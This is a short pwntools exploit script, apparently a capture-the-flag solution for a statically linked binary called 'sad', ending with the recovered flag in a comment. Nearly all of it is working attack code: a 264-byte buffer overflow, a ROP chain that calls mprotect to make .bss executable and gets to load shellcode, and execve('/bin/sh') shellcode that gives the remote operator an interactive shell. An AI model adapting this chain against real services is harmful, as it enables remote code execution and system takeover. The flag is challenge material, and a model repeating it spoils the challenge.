from pwn import *

HOST = "jh2i.com"
PORT = 50002
exe = ELF("./sad")
p = remote(HOST, PORT)

context.binary = './sad'

p.recvline()

rop = ROP(exe.path)

free_space = 0x4b1ab0
offset = 264
bss = 0x00000000004b1000

PopRdi = rop.find_gadget(['pop rdi', 'ret'])[0]
PopRsi = rop.find_gadget(['pop rsi', 'ret'])[0]
PopRdx = rop.find_gadget(['pop rdx', 'ret'])[0]

log.success('Pop Rdi; ret @ 0x%x', PopRdi)

payload = (
        b'M' * offset +
        p64(PopRdi) +
        p64(bss) +
        p64(PopRsi) +
        p64(0x1000) +
        p64(PopRdx) +
        p64(0x7) +
        p64(exe.sym['mprotect']) +
        p64(PopRdi) +
        p64(free_space) +
        p64(exe.sym['gets']) +
        p64(free_space + 0x8)
)

shellcode = asm('''
mov rdi, 0x4b1ab0
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
'''
                )

payload2 = b'/bin/sh\x00' + shellcode
p.sendline(payload)
sleep(1)
p.sendline(payload2)
p.interactive()

# FLAG --> flag{radically_statically_roppingly_vulnerable}
